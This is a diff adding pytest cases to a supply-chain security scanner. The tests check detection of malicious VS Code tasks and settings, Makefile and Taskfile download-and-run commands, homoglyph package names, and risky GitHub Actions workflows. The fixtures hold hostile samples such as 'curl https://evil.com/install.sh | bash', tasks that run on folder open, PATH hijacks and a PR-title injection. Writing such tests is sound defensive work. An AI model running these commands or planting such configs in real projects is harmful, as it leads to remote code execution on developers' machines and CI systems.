@@ -488,6 +488,287 @@ class TestHardcodedSecrets:
 
 
 # ──────────────────────────────────────────────
+# 7b. VS Code / IntelliJ IDE Attack Detection (P1-1)
+# ──────────────────────────────────────────────
+
+class TestIdeAttack:
+    """P1-1: IDE configuration attack detection."""
+
+    def test_clean_vscode_tasks(self, tmp_dir, checker):
+        tasks = {"version": "2.0.0", "tasks": [
+            {"label": "build", "type": "shell", "command": "cargo build",
+             "group": "build"}
+        ]}
+        vscode = tmp_dir / ".vscode"
+        vscode.mkdir()
+        (vscode / "tasks.json").write_text(json.dumps(tasks))
+        issues = checker.check_vscode_tasks(vscode / "tasks.json")
+        assert issues == []
+
+    def test_auto_run_on_folder_open(self, tmp_dir, checker):
+        tasks = {"version": "2.0.0", "tasks": [
+            {"label": "evil", "type": "shell", "command": "echo hi",
+             "runOptions": {"runOn": "folderOpen"}}
+        ]}
+        vscode = tmp_dir / ".vscode"
+        vscode.mkdir()
+        p = vscode / "tasks.json"
+        p.write_text(json.dumps(tasks))
+        issues = checker.check_vscode_tasks(p)
+        assert any(i['rule_id'] == 'IDE-001' for i in issues)
+        assert any(i['severity'] == 'CRITICAL' for i in issues)
+
+    def test_dangerous_command_in_task(self, tmp_dir, checker):
+        tasks = {"version": "2.0.0", "tasks": [
+            {"label": "setup", "type": "shell",
+             "command": "curl https://evil.com/install.sh | bash"}
+        ]}
+        vscode = tmp_dir / ".vscode"
+        vscode.mkdir()
+        p = vscode / "tasks.json"
+        p.write_text(json.dumps(tasks))
+        issues = checker.check_vscode_tasks(p)
+        assert any(i['rule_id'] == 'IDE-002' for i in issues)
+
+    def test_vscode_path_hijack(self, tmp_dir, checker):
+        settings = {
+            "terminal.integrated.env.linux": {"PATH": "/tmp/evil:/usr/bin:$PATH"}
+        }
+        vscode = tmp_dir / ".vscode"
+        vscode.mkdir()
+        p = vscode / "settings.json"
+        p.write_text(json.dumps(settings))
+        issues = checker.check_vscode_settings(p)
+        assert any(i['rule_id'] == 'IDE-003' for i in issues)
+        assert any(i['severity'] == 'CRITICAL' for i in issues)
+
+    def test_vscode_clean_settings(self, tmp_dir, checker):
+        settings = {"editor.tabSize": 4, "python.defaultInterpreterPath": ".venv/bin/python"}
+        vscode = tmp_dir / ".vscode"
+        vscode.mkdir()
+        p = vscode / "settings.json"
+        p.write_text(json.dumps(settings))
+        issues = checker.check_vscode_settings(p)
+        assert issues == []
+
+    def test_scan_ide_configs_finds_both(self, tmp_dir, checker):
+        """scan_ide_configs should find issues across tasks.json and settings.json"""
+        vscode = tmp_dir / ".vscode"
+        vscode.mkdir()
+        # Dangerous task
+        tasks = {"version": "2.0.0", "tasks": [
+            {"label": "evil", "type": "shell", "command": "wget http://x.com/x.sh",
+             "runOptions": {"runOn": "folderOpen"}}
+        ]}
+        (vscode / "tasks.json").write_text(json.dumps(tasks))
+        # PATH override
+        settings = {"terminal.integrated.env.linux": {"PATH": "/tmp/x:$PATH"}}
+        (vscode / "settings.json").write_text(json.dumps(settings))
+
+        issues = checker.scan_ide_configs(tmp_dir)
+        rule_ids = {i['rule_id'] for i in issues}
+        assert 'IDE-001' in rule_ids
+        assert 'IDE-003' in rule_ids
+
+
+# ──────────────────────────────────────────────
+# 7c. Makefile / Taskfile Build Script Attack (P1-2)
+# ──────────────────────────────────────────────
+
+class TestBuildScripts:
+    """P1-2: Makefile and Taskfile supply chain attack detection."""
+
+    def test_clean_makefile(self, tmp_dir, checker):
+        content = "build:\n\tcargo build --release\n\ntest:\n\tcargo test\n"
+        (tmp_dir / "Makefile").write_text(content)
+        issues = checker.check_makefile(tmp_dir / "Makefile")
+        assert issues == []
+
+    def test_curl_pipe_to_shell(self, tmp_dir, checker):
+        content = "install:\n\tcurl https://evil.com/install.sh | bash\n"
+        (tmp_dir / "Makefile").write_text(content)
+        issues = checker.check_makefile(tmp_dir / "Makefile")
+        assert any(i['rule_id'] == 'BUILD-001' for i in issues)
+        assert any(i['severity'] == 'CRITICAL' for i in issues)
+
+    def test_wget_pipe_to_sh(self, tmp_dir, checker):
+        content = "setup:\n\twget -qO- https://example.com/setup.sh | sh\n"
+        (tmp_dir / "Makefile").write_text(content)
+        issues = checker.check_makefile(tmp_dir / "Makefile")
+        assert any(i['rule_id'] == 'BUILD-001' for i in issues)
+
+    def test_shell_eval_with_curl(self, tmp_dir, checker):
+        content = "bootstrap:\n\t$(shell curl https://evil.com/script.sh -s)\n"
+        (tmp_dir / "Makefile").write_text(content)
+        issues = checker.check_makefile(tmp_dir / "Makefile")
+        assert any(i['rule_id'] == 'BUILD-002' for i in issues)
+
+    def test_makefile_comment_not_flagged(self, tmp_dir, checker):
+        content = "# curl https://evil.com/install.sh | bash  # disabled\nbuild:\n\tmake all\n"
+        (tmp_dir / "Makefile").write_text(content)
+        issues = checker.check_makefile(tmp_dir / "Makefile")
+        critical = [i for i in issues if i['severity'] == 'CRITICAL']
+        assert critical == []
+
+    def test_taskfile_curl_pipe(self, tmp_dir, checker):
+        content = "version: '3'\ntasks:\n  setup:\n    cmds:\n      - curl https://evil.com/x | bash\n"
+        (tmp_dir / "Taskfile.yml").write_text(content)
+        issues = checker.check_taskfile(tmp_dir / "Taskfile.yml")
+        assert any(i['rule_id'] == 'BUILD-001' for i in issues)
+        assert any(i['severity'] == 'CRITICAL' for i in issues)
+
+    def test_clean_taskfile(self, tmp_dir, checker):
+        content = "version: '3'\ntasks:\n  build:\n    cmds:\n      - go build ./...\n"
+        (tmp_dir / "Taskfile.yml").write_text(content)
+        issues = checker.check_taskfile(tmp_dir / "Taskfile.yml")
+        assert issues == []
+
+
+# ──────────────────────────────────────────────
+# 7d. Unicode Homoglyph Package Name Detection (P1-3)
+# ──────────────────────────────────────────────
+
+class TestHomoglyphDetection:
+    """P1-3: Unicode homoglyph / lookalike package name attack detection."""
+
+    def test_clean_ascii_package(self, tmp_dir, checker):
+        issues = checker.check_package_name_homoglyphs('requests', 'python', tmp_dir / 'req.txt')
+        assert issues == []
+
+    def test_cyrillic_a_in_openai(self, tmp_dir, checker):
+        # Cyrillic 'а' (U+0430) instead of Latin 'a'
+        fake_pkg = 'open\u0430i'   # looks like 'openai' but has Cyrillic а
+        issues = checker.check_package_name_homoglyphs(fake_pkg, 'python', tmp_dir / 'req.txt')
+        assert len(issues) > 0
+        assert issues[0]['rule_id'] == 'SUPPLY-030'
+        assert issues[0]['severity'] == 'CRITICAL'
+        assert issues[0]['spoofs'] == 'openai'
+
+    def test_cyrillic_chars_in_numpy(self, tmp_dir, checker):
+        # Cyrillic 'р' (U+0440) looks like Latin 'p', 'у' looks like 'y'
+        fake_pkg = 'num\u0440\u0443'  # 'numру' → looks like 'numpy'
+        issues = checker.check_package_name_homoglyphs(fake_pkg, 'python', tmp_dir / 'req.txt')
+        # May or may not match depending on normalization — just verify no crash
+        assert isinstance(issues, list)
+
+    def test_homoglyph_in_requirements(self, tmp_dir, checker):
+        # Write a requirements.txt with a homoglyph package name
+        # Use UTF-8 encoding so the Cyrillic е survives the file round-trip
+        fake_requests = 'requ\u0435sts'  # Cyrillic е (U+0435) instead of Latin e
+        req_file = tmp_dir / "requirements.txt"
+        req_file.write_text(f'{fake_requests}==2.28.0\n', encoding='utf-8')
+        issues = checker.check_python_dependencies(req_file)
+        # Should flag as homoglyph
+        homoglyph_issues = [i for i in issues if i.get('type') == 'homoglyph_attack']
+        assert len(homoglyph_issues) > 0
+
+    def test_pure_ascii_not_flagged_as_homoglyph(self, tmp_dir, checker):
+        for pkg in ['requests', 'numpy', 'openai', 'anthropic', 'flask']:
+            issues = checker.check_package_name_homoglyphs(pkg, 'python', tmp_dir / 'req.txt')
+            assert issues == [], f"False positive for ASCII package: {pkg}"
+
+
+# ──────────────────────────────────────────────
+# 7e. GitHub Actions Enhanced Checks (P1-4)
+# ──────────────────────────────────────────────
+
+class TestGitHubActionsEnhanced:
+    """P1-4: GitHub Actions high-risk pattern detection."""
+
+    def test_clean_workflow(self, tmp_dir, checker):
+        content = """
+on:
+  push:
+    branches: [main]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
+      - run: echo "Building..."
+"""
+        wf = tmp_dir / "ci.yml"
+        wf.write_text(content)
+        issues = checker.check_github_actions_enhanced(wf)
+        assert issues == []
+
+    def test_set_env_deprecated_command(self, tmp_dir, checker):
+        content = """
+on: push
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "::set-env name=FOO::bar"
+"""
+        wf = tmp_dir / "ci.yml"
+        wf.write_text(content)
+        issues = checker.check_github_actions_enhanced(wf)
+        assert any(i['rule_id'] == 'GHAS-001' for i in issues)
+        assert any(i['severity'] == 'CRITICAL' for i in issues)
+
+    def test_add_path_deprecated_command(self, tmp_dir, checker):
+        content = "      - run: echo \"::add-path::/tmp/evil\"\n"
+        wf = tmp_dir / "ci.yml"
+        wf.write_text(content)
+        issues = checker.check_github_actions_enhanced(wf)
+        assert any(i['rule_id'] == 'GHAS-003' for i in issues)
+
+    def test_untrusted_pr_title_injection(self, tmp_dir, checker):
+        content = """
+on: pull_request
+jobs:
+  label:
+    runs-on: ubuntu-latest
+    steps:
+      - run: echo "${{ github.event.pull_request.title }}"
+"""
+        wf = tmp_dir / "ci.yml"
+        wf.write_text(content)
+        issues = checker.check_github_actions_enhanced(wf)
+        assert any(i['rule_id'] == 'GHAS-002' for i in issues)
+        assert any(i['severity'] == 'CRITICAL' for i in issues)
+
+    def test_pwn_request_pattern(self, tmp_dir, checker):
+        content = """
+on:
+  pull_request_target:
+    types: [opened]
+jobs:
+  deploy:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: ${{ github.event.pull_request.head.ref }}
+      - run: ./deploy.sh
+"""
+        wf = tmp_dir / "ci.yml"
+        wf.write_text(content)
+        issues = checker.check_github_actions_enhanced(wf)
+        pwn = [i for i in issues if i.get('type') == 'pwn_request']
+        assert len(pwn) > 0
+        assert pwn[0]['severity'] == 'CRITICAL'
+
+    def test_safe_pr_target_without_fork_checkout(self, tmp_dir, checker):
+        # pull_request_target alone (without fork checkout) should not be flagged as pwn_request
+        content = """
+on:
+  pull_request_target:
+jobs:
+  label:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/labeler@v4
+"""
+        wf = tmp_dir / "ci.yml"
+        wf.write_text(content)
+        issues = checker.check_github_actions_enhanced(wf)
+        pwn = [i for i in issues if i.get('type') == 'pwn_request']
+        assert pwn == []
+
+
+# ──────────────────────────────────────────────
 # 8. Rust build.rs Compile-time Execution (P0-2)
 # ──────────────────────────────────────────────
 
